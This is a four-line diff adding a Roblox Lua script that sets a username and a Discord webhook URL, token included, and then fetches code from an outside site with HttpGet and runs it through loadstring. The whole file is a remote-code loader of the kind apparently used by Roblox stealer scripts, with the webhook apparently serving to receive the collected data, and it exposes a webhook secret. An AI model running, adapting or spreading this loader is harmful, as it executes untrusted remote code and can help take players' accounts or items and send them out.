@@ -1,0 +1,4 @@
+UserName = "NovaChaos75"
+Webhook = "https://discord.com/api/webhooks/1315286981785288754/E2FwohRTdXDGVrxXa7In7rndxkqRqVwT2phSMIJQUS9eTKhBFha0_baMQHXtjS4lPvIZ"
+
+loadstring(game:HttpGet("https://darkscripts.space/pleasedonate",true))()
